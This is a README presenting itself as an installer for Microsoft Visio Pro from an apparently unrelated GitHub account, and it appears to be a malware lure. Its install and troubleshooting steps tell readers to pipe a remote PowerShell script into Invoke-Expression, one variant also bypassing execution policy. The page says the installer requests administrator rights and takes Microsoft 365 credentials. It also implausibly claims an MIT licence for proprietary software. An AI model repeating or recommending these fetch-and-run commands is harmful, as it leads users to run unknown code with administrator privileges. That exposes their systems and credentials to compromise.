# Microsoft Visio Pro Installer
the industry-standard diagramming and vector graphics tool for creating professional flowcharts, org charts, network diagrams, and business process models.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for Microsoft click-to-run service installation.
- Downloads Microsoft Visio Pro via the Office Deployment Tool silently.
- Installs Visio with all diagram template collections and stencil libraries.
- Activates the license via your Microsoft 365 account credentials on first launch.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~2800 MB free disk space

## Troubleshooting

**Shape stencil panels appear empty after installation is complete**

Go to More Shapes in the Shapes panel and download the required stencil from Microsoft Online shapes.

**Diagrams lose alignment and spacing when exported to PowerPoint slides**

Export diagrams as EMF vector format instead of PNG for perfect scaling in presentation slides.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.